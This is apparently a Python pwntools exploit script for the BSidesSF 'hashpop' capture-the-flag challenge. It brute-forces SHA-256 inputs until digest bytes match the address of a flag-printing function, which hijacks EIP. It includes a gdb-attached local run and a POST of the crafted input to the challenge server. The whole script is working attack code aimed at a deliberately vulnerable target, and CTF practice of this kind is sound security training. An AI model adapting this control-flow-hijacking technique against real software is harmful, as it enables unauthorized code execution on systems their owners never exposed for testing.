from pwn import *
import requests
import hashlib

# generate random hash
def generate_sha256(s):
    elf = ELF('./hashpop')
    offsets = [ elf.symbols['print_flag'], elf.symbols['print_flag_json'], elf.symbols['print_flag_xml']]

    while True:
        h = hashlib.sha256()
        h.update(str(s))
        c = u32((h.digest())[0x10:0x10+4])
        if c in offsets:
            log.info('found hash for control eip: %s(%s)' % (str(s), h.hexdigest()))
            return 0
        s = str(h.hexdigest())

# generate_sha256(0)
# [*] found hash for control eip: fb18592c3edca00d1c7a61124166dfe7ed2d1a840b570c55efb7a897ea25870f(2af06d3ae24ae97a0067182f4a50b136d0ab0408b5214820909021e77aabb5ee)

# debug
def local():
    context.log_level = 'debug'
    r = process('./hashpop')
    gdb_script = '''
    break *0x80493dd
    '''
    gdb.attach(r, gdb_script)
    p = 'input=fb18592c3edca00d1c7a61124166dfe7ed2d1a840b570c55efb7a897ea25870f&hash=sha256'
    r.send(p)
    r.interactive()

# exploit
def remote():
    uri = 'https://hashpop-b0263f3c.challenges.bsidessf.net/cgi-bin/hashpop'
    data = u'input=fb18592c3edca00d1c7a61124166dfe7ed2d1a840b570c55efb7a897ea25870f&hash=sha256'
    resp = requests.post(uri, data=data)
    print resp.headers
    print resp.text

if __name__ == '__main__':
    local()
    # remote()